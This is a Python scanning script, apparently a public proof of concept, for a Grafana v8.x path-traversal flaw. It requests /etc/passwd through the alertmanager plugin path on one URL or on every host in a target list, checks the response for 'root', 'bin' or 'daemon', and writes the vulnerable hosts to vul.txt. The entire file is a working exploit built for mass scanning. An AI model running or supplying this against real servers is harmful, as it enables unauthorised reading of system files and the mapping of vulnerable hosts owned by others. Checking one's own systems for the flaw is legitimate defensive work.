import sys,argparse
import requests
from rich.console import Console
console = Console()
def banner():
    msg=r'''
      _                           _      _               
     ( )                         ( )   /' )              
     | |/')    __     __   _ _   | |_ (_, | _   _    __  
     | , <   /'__`\ /'__`\( '_`\ | '_`\ | |( ) ( ) /'__`\
     | |\`\ (  ___/(  ___/| (_) )| |_) )| || (_) |(  ___/
     (_) (_)`\____)`\____)| ,__/'(_,__/'(_)`\___/'`\____)
                          | |                            
author:keepb1ue           (_)                            
Grafana v8.x
grafana任意文件读取检测工具
python3 grafana.py -u/--url http://ip:port/
python3 grafana.py -f/--file target.txt
'''
    console.print(msg, style="bold red")
if len(sys.argv)<3:
    banner()
parser = argparse.ArgumentParser()
parser.add_argument("-u",'--url',help='[+]please enter a url[+]')
parser.add_argument("-f",'--file',help='[+]please enter a file[+]')
args = parser.parse_args()
url = args.url
file = args.file
#print(url,file)
path = '/public/plugins/alertmanager/../../../../../../../..'
payload = "/etc/passwd"
if url:
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36", "Connection": "close"}
    if url[:4] != 'http':
        url = 'http://' + url
    vul_url = url + path + payload
    try:
	    res = requests.get(vul_url, headers=headers,verify=False,timeout=4)
	    if "root" in res.text or "bin" in res.text or "daemon" in res.text:
	        print("\033[32m[o] 目标{}存在grafana任意文件读取漏洞!!! \033[0m".format(url))
	    else:
	        print("\033[31m[x] {} 不存在grafana任意文件读取漏洞[x] \033[0m".format(url))
    except Exception as e:
    	print("\033[31m[-]{}connect timeout![-]\033[0m".format(url))
if file:
    with open(file) as f:
        lines = f.readlines()
        for line in lines:
            line = line.strip()
            if line[:4] != 'http':
                line = 'http://' + line
            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36", "Connection": "close"}
            vul_url = line + path + payload
            try:
                res = requests.get(vul_url, headers=headers,verify=False,timeout=4)
                if "root" in res.text or "bin" in res.text or "daemon" in res.text:
                    print("\033[32m[o] 目标{}存在grafana任意文件读取漏洞!!! \033[0m".format(line))
                    with open('vul.txt','a') as f:
                        f.write(line+'\n')
                else:
                    print("\033[31m[x] {} 不存在grafana任意文件读取漏洞[x] \033[0m".format(line))
            except Exception as e:
                print("\033[31m[-]{}connect timeout![-]\033[0m".format(line))
